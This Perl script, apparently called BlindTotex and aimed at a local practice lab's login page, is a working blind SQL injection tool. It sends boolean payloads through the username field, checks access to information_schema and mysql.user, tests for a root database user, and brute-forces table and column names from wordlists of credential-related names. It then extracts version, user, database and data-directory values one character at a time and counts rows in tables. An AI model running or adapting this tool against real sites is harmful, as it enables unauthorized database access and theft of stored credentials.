#!/usr/bin/perl -w
#http://perlenespanol.com/tutoriales/cgi/envio_de_datos_a_documentos_post_o_get.html
use LWP::UserAgent;
use HTTP::Request;
use URI::Escape;
use Term::ANSIColor;
use Switch;



@nombretabla=('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario','web_users',
	  'name','names','nombre','nombres','usuarios','member','members','admin_table','usuaris','web_usuarios',
	  'miembro','miembros','membername','admins','administrator','sign','config','USUARIS','cms_operadores',
	  'administrators','passwd','password','passwords','pass','Pass','mpn_authors','author','musuario','mysql.user',
	  'user_names','foro','tAdmin','tadmin','user_password','user_passwords','user_name',
	  'member_password','mods','mod','moderators','moderator','user_email','jos_users','mb_user','host','apellido_nombre',
	  'user_emails','user_mail','user_mails','mail','emails','email','address','jos_usuarios','tutorial_user_auth',
	  'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','tbl_usuarios','user_auth','login_radio',
	  'login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass','tbl_admin','usuarios_head',
	  'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','BG_CMS_Users',
	  'tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id','foro_usuarios','cliente',
	  'sistema_usuario','sistema_password','contrasena','auth','key','senha','signin','dir_admin','alias','clientes',
	  'tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member','calendar_users','cursos',
      'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','web_users','curso',
      'membros','utilizadores','staff','nuke_authors','accounts','account','accnts','signup','leads','lead',
      'associated','accnt','customers','customer','membres','administrateur','utilisateur','riacms_users',
      'tuser','tusers','utilisateurs','password','amministratore','god','God','authors','wp_users','tb_usuarios',
      'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','tb_usuario',
	  'Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');

@nombrecolumna=('admin_name','usuario_user','usuario_pass','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email','senha',
          'username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail','cliente',
          'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','host','pws','cedula','userName','host_password','chave','alias','apellido_nombre','cliente_nombre','cliente_email','cliente_pass','cliente_user','cliente_usuario',
          'login_id','usr','sistema_id','author','user_login','admin_user','admin_pass','uh_usuario','uh_password','psw','host_username',
          'sistema_usuario','auth','key','usuarios_nombre','usuarios_nick','usuarios_password','user_clave',
		  'membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo','usuario_nombre','usuario_nick','usuario_password',
          'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
          'user_pwd','u_pass','clave','usuario','contrasena','pas','siste	ma_password','autor','upassword','web_password','web_username');
system('clear');
#print color 'bold blue';
print colored ("\n===================================================\n[+]", 'bold blue');
print "\t BlindTotex 1.0 | By MagnoBalt \t\t";print colored ("[+]", 'bold blue');
print colored ("\n===================================================", 'bold blue');
		 
		  
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3 GTB7.1");

my $url = "http://localhost/vulntotex/vulnerabilidades/sql/admin_blind/login_blind.php";

my $req = HTTP::Request->new(POST => $url);#creo el objeto HTTP para POST 
$req->content_type('application/x-www-form-urlencoded');

#---------------information_schema---------------------
print colored  ("\n\n[!]",'bold white');print "Verificando si hay permiso en information_schema";
my $query = "usuario=foo' or  (SELECT COUNT(*) FROM information_schema.tables) and '1'='1&pass=admin123";
$req->content($query);
my $mreq= $ua->request($req)->as_string; 

if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
	    {
  			print colored ("\n[+]", 'bold red');print "Permiso autorizado en information_schema";
		}
		else {
			print "\n[-]Permiso denegado en information_schema";
		}

#---------------mysql.user---------------------
print colored  ("\n\n[!]",'bold white');print "Verificando si hay permiso en mysql.user";
my $query = "usuario=foo' or  (SELECT COUNT(*) FROM mysql.user) and '1'='1&pass=admin123";
$req->content($query);
my $mreq= $ua->request($req)->as_string;  
if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
	    {
  			print colored ("\n[+]", 'bold red');print "Permiso autorizado en mysql.user";
		}
		else {
			print "\n[-]Permiso denegado en mysql.user";
		}
		
		
#--------------user r00t?---------------------
print colored  ("\n\n[!]",'bold white');print "Verificando si el usuario es root de MySQL";
my $query = "usuario=foo' or  (select ascii(substring(user(),1,1)) = 114) and (select ascii(substring(user(),2,1)) = 111) and (select ascii(substring(user(),3,1)) = 111) and (select ascii(substring(user(),4,1)) = 116)--%20&pass=admin123";
$req->content($query);
my $mreq= $ua->request($req)->as_string; 
if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
	    {
  			print colored ("\n[+]", 'bold red');print "El Usuario es root :)";
		}
		else {
			print "\n[-]El Usuario no es root";
		}

		
#--------------brutear tablas------------------

print colored  ("\n\n[!]",'bold white');print "Bruteando Tablas";
foreach $tabla(@nombretabla)
        {
                  chomp($tabla);
			   	  my $query = "usuario=foo' or  (SELECT COUNT(*) FROM ".$tabla.") and '1'='1&pass=admin123";
			   	  $req->content($query);
                  my $mreq= $ua->request($req)->as_string; 
			      if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
			   	    {
			   			print colored ("\n[+]", 'bold red');print "Tabla ".$tabla." encontrada";
                    }
	    }
		


#---------------------Bruteando Columnas----------------------------------------------

print colored  ("\n\n[!]",'bold white');print "Bruteando Columnas";
print "\n[?] Tabla a la cual Brutear Columna: ";print colored ("->  ", 'bold red');
$tabla=<STDIN>;
chomp($tabla);
print "\n[!] Buscando columnas para la tabla ".$tabla;
foreach $columna(@nombrecolumna)
        {
                  chomp($columna);
				  my $query = "usuario=foo' or  (SELECT COUNT(".$columna.") FROM ".$tabla.") and '1'='1&pass=admin123";
				  $req->content($query);
                  my $mreq= $ua->request($req)->as_string; 
			      if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
				    {
						print colored ("\n[+]", 'bold red');print "Columna ".$columna." encontrada";
                    }
	    }



		
#------------------Opciones--------------------------------------
&opciones;

sub opciones {
print colored ("\n===================================================\n[+]", 'bold blue');
print "\t\tElija alguna Opcion \t\t";print colored ("[+]", 'bold blue');
print colored ("\n===================================================", 'bold blue');
print colored ("\n1\t", 'bold red');print "version()";
print colored ("\n2\t", 'bold red');print "user()";
print colored ("\n3\t", 'bold red');print "database()";
print colored ("\n4\t", 'bold red');print "\@\@datadir";
print colored ("\n5\t", 'bold red');print "Contar Registros de una tabla";
print colored ("\n6\t", 'bold red');print "salir()";
print colored ("\n-->  ", 'bold red');
$opcion=<STDIN>;
chomp($opcion);
switch ($opcion) {
   case 1 {$info="version()"; &informacion($info);}
   case 2 {$info="user()"; &informacion($info);}
   case 3 {$info="database()"; &informacion($info);}
   case 4 {$info="\@\@datadir"; &informacion($info);}
   case 5 {&contar;}
   case 6 {exit(0);}
   else {print colored ("[-]",	'bold red');print " No esta dentro de las opciones";&opciones}


	}
}

#--------------------info-----------------------------------------
sub informacion{
my $info = shift;
$search=32;
$pos=1;
while ($search <= 122)
    {
	my $query = "usuario=foo' or  (select ascii(substring(".$info.",".$pos.",1)) =".$search.")--%20&pass=admin123";
    $req->content($query);
                  my $mreq= $ua->request($req)->as_string; 
			      if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
				    {
					  $char .= chr($search);
                  	  #print "$char";
                      $search = 0;
                      $pos++;
        		    }
				  $search++;
	    }
      print colored ("\n[+]", 'bold red');print " Busqueda: ".$char;
	  $char="";
	&opciones;	
	}
	




#--------------------Contar Registros---------------------
sub contar{ 
print colored  ("\n\n[!]",'bold white');print "Contar registros";
print "\n[?] Tabla a la cual contar registros: ";print colored ("->  ", 'bold red');
$tabla=<STDIN>;
chomp($tabla);
#----                 Verifico que la tabla exista, para que no entre en un bucle----
my $query = "usuario=foo' or  (SELECT COUNT(*) FROM ".$tabla.")--%20&pass=admin123";
$req->content($query);
my $mreq= $ua->request($req)->as_string; 
if($mreq=~/Location: login.php\?errorusuario=p/){

$prob=10;
$salida=0;
while($salida == 0){
my $query = "usuario=foo' or  (SELECT COUNT(*) FROM ".$tabla.") > ".$prob."--%20&pass=admin123";
				  $req->content($query);
                  my $mreq= $ua->request($req)->as_string; 
				     if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
	                        {
					         $prob=$prob+10;
					 	    }
					else
							{
							$salida=1;    
							$prob--;
							}
}		
$salida=0;
while($salida == 0){
my $query = "usuario=foo' or  (SELECT COUNT(*) FROM ".$tabla.") = ".$prob."--%20&pass=admin123";
				  $req->content($query);
                  my $mreq= $ua->request($req)->as_string; 
				     if($mreq=~/Location: login.php\?errorusuario=p/)#verifico en las cabeceras el Location 
	                        {
					         print colored ("\n[+]", 'bold red');print " La tabla ".$tabla." contiene ";print colored ($prob, 'bold red');print " registros.";   
							 $salida=1;
					 	    }
                  $prob--;   
}


	}
	else{
	print colored ("[-]",	'bold red');print "Tabla Inexistente ";
	}
	&opciones;
	
}#cierro contar		


#print "estas son las cabeceras:  \n".$mreq;
# select * from usuarios where id =1 AND (SELECT IF((SELECT case (ascii(mid((SELECT user()),1,1)) BETWEEN 32 AND 122) when true then (true) else false end),(SELECT case (ascii(mid((SELECT user()),1,1)) BETWEEN 77 AND 122) when true then (true) else false end),false));

